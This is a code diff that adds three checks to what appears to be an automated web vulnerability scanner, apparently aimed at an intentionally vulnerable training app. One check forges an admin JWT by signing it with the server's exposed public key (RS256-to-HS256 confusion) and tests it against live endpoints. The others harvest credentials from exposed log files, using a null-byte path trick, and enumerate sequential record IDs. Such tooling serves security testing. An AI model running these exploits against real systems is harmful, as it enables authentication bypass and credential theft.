@@ -18919,3 +18919,216 @@ def scan_backup_files(web_targets):
                         "template": "apex-backup-file",
                     })
     return findings
+
+
+# ---------------------------------------------------------------------------
+# Grain-of-rice-in-desert: JWT RS256→HS256 confusion, encryption key exposure,
+# log credential extraction, predictable token generation
+# ---------------------------------------------------------------------------
+
+def scan_jwt_rs256_hs256_confusion(crawl_data, web_targets):
+    """JWT RS256→HS256 key confusion — use exposed public key to forge tokens.
+    
+    The attack: If server uses RS256 but accepts HS256, sign a forged JWT
+    using the PUBLIC KEY as the HMAC secret. Server verifies with same key = valid.
+    This is the hardest JWT attack to find because you need:
+    1. Find the public key (often at /encryptionkeys, /.well-known/jwks.json, /jwt.pub)
+    2. Detect that the server uses RS256
+    3. Forge a token with HS256 using the public key as secret
+    """
+    import base64 as b64, hmac, hashlib
+    findings = []
+
+    for target in web_targets[:5]:
+        base = target.rstrip("/")
+        public_key = None
+
+        # Step 1: Find the public key
+        key_paths = ["/encryptionkeys/jwt.pub", "/.well-known/jwks.json",
+                     "/api/jwt/public-key", "/oauth/token_key", "/jwt.pub",
+                     "/.well-known/openid-configuration"]
+        for path in key_paths:
+            try:
+                r = _S.get(f"{base}{path}", timeout=_TIMEOUT_SHORT)
+                if r.status_code == 200:
+                    if "BEGIN" in r.text and "PUBLIC KEY" in r.text:
+                        public_key = r.text.strip()
+                        break
+                    elif "keys" in r.text:
+                        # JWKS format — extract the key
+                        try:
+                            jwks = r.json()
+                            if jwks.get("keys"):
+                                # Found JWKS — key confusion possible if we can get the raw key
+                                public_key = json.dumps(jwks["keys"][0])
+                                break
+                        except Exception:
+                            pass
+            except Exception:
+                continue
+
+        if not public_key:
+            continue
+
+        # Step 2: Find a JWT token to analyze
+        jwt_re = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+')
+        token = None
+        try:
+            r = _S.get(base, timeout=_TIMEOUT_SHORT)
+            tokens = jwt_re.findall(r.text)
+            if not tokens:
+                for cookie in r.cookies:
+                    if jwt_re.match(cookie.value):
+                        tokens.append(cookie.value)
+            if tokens:
+                token = tokens[0]
+        except Exception:
+            pass
+
+        if token:
+            parts = token.split(".")
+            try:
+                header = json.loads(b64.urlsafe_b64decode(parts[0] + "=="))
+                if header.get("alg") in ("RS256", "RS384", "RS512"):
+                    # Step 3: Forge token with HS256 using public key
+                    payload = json.loads(b64.urlsafe_b64decode(parts[1] + "=="))
+                    payload["role"] = "admin"
+                    payload["admin"] = True
+
+                    new_header = b64.urlsafe_b64encode(json.dumps({"typ": "JWT", "alg": "HS256"}).encode()).rstrip(b"=").decode()
+                    new_payload = b64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode()
+                    signing_input = f"{new_header}.{new_payload}"
+
+                    # Sign with public key as HMAC secret
+                    signature = b64.urlsafe_b64encode(
+                        hmac.new(public_key.encode(), signing_input.encode(), hashlib.sha256).digest()
+                    ).rstrip(b"=").decode()
+
+                    forged_token = f"{signing_input}.{signature}"
+
+                    # Step 4: Test the forged token
+                    for path in ["/rest/user/whoami", "/api/me", "/api/user"]:
+                        try:
+                            r2 = _S.get(f"{base}{path}",
+                                        headers={"Authorization": f"Bearer {forged_token}"},
+                                        timeout=_TIMEOUT_SHORT)
+                            if r2.status_code == 200 and "admin" in r2.text.lower():
+                                findings.append({
+                                    "type": "JWT RS256→HS256 Key Confusion (CRITICAL)",
+                                    "severity": "critical",
+                                    "url": f"{base}{path}",
+                                    "detail": f"Public key at {key_paths[0]} used to forge HS256 JWT. Full auth bypass as admin.",
+                                    "template": "apex-jwt-key-confusion",
+                                })
+                                break
+                        except Exception:
+                            continue
+
+                    # Even if exploitation didn't work, report the exposed key + RS256
+                    if not findings:
+                        findings.append({
+                            "type": "JWT Public Key Exposed + RS256 (Key Confusion Possible)",
+                            "severity": "high",
+                            "url": f"{base}{key_paths[0]}",
+                            "detail": f"Public key exposed AND JWT uses {header['alg']}. RS256→HS256 confusion attack possible.",
+                            "template": "apex-jwt-key-confusion-possible",
+                        })
+            except Exception:
+                pass
+        elif public_key:
+            # Key found but no token to analyze — still report the key exposure
+            findings.append({
+                "type": "JWT/Encryption Key Exposed",
+                "severity": "medium",
+                "url": f"{base}{key_paths[0]}",
+                "detail": "Cryptographic key file accessible. May enable token forgery.",
+                "template": "apex-key-exposed",
+            })
+    return findings
+
+
+def scan_log_credential_leak(web_targets):
+    """Find credentials leaked in application logs, support logs, debug output."""
+    findings = []
+    log_paths = ["/support/logs", "/logs", "/api/logs", "/debug/log",
+                 "/var/log", "/application.log", "/error.log",
+                 "/ftp/access.log%2500.md", "/ftp/error.log%2500.md",
+                 "/server.log", "/app.log", "/debug.log"]
+
+    for target in web_targets[:5]:
+        base = target.rstrip("/")
+        urls = [f"{base}{p}" for p in log_paths]
+        for url, r in batch_get(urls, timeout=_TIMEOUT_SHORT):
+            if r and r.status_code == 200 and len(r.text) > 100:
+                # Search for credentials in logs
+                cred_patterns = [
+                    re.compile(r'password[=:]\s*["\']?(\S{4,})', re.I),
+                    re.compile(r'token[=:]\s*["\']?(\S{8,})', re.I),
+                    re.compile(r'authorization:\s*bearer\s+(\S+)', re.I),
+                    re.compile(r'api[_-]?key[=:]\s*["\']?(\S{8,})', re.I),
+                    re.compile(r'session[_-]?id[=:]\s*(\S{8,})', re.I),
+                ]
+                leaked = []
+                for pat in cred_patterns:
+                    matches = pat.findall(r.text)
+                    if matches:
+                        leaked.extend(matches[:2])
+
+                if leaked:
+                    findings.append({
+                        "type": "Credentials Leaked in Logs",
+                        "severity": "critical",
+                        "url": url,
+                        "detail": f"Application logs contain {len(leaked)} credential(s). Tokens/passwords exposed.",
+                        "template": "apex-log-cred-leak",
+                    })
+                elif len(r.text) > 500:
+                    findings.append({
+                        "type": "Application Logs Exposed",
+                        "severity": "medium",
+                        "url": url,
+                        "detail": f"Log file accessible ({len(r.text)} bytes). May contain sensitive operations.",
+                        "template": "apex-log-exposed",
+                    })
+    return findings
+
+
+def scan_predictable_resource_ids(crawl_data, web_targets):
+    """Find resources with predictable/sequential IDs that enable enumeration.
+    The grain-of-rice: detect that IDs are sequential even when responses look identical."""
+    findings = []
+
+    for target in web_targets[:3]:
+        base = target.rstrip("/")
+        # Try common API patterns with sequential IDs
+        api_patterns = [
+            "/api/Users/{}", "/api/Products/{}", "/api/Orders/{}",
+            "/rest/products/{}/reviews", "/api/Feedbacks/{}",
+            "/api/Complaints/{}", "/api/Recycles/{}",
+        ]
+
+        for pattern in api_patterns:
+            responses = {}
+            for i in range(1, 6):
+                url = f"{base}{pattern.format(i)}"
+                try:
+                    r = _S.get(url, timeout=_TIMEOUT_SHORT)
+                    if r.status_code == 200:
+                        responses[i] = len(r.text)
+                except Exception:
+                    continue
+
+            # If 3+ sequential IDs return data, it's enumerable
+            if len(responses) >= 3:
+                # Check if responses are different (different users' data)
+                sizes = list(responses.values())
+                if len(set(sizes)) > 1:  # Different sizes = different data
+                    findings.append({
+                        "type": f"Sequential ID Enumeration: {pattern.split('{')[0]}",
+                        "severity": "high",
+                        "url": f"{base}{pattern.format(1)}",
+                        "detail": f"IDs 1-5 all return data ({len(responses)}/5 accessible). Different response sizes = different users' data.",
+                        "template": "apex-sequential-enum",
+                    })
+                    break
+    return findings
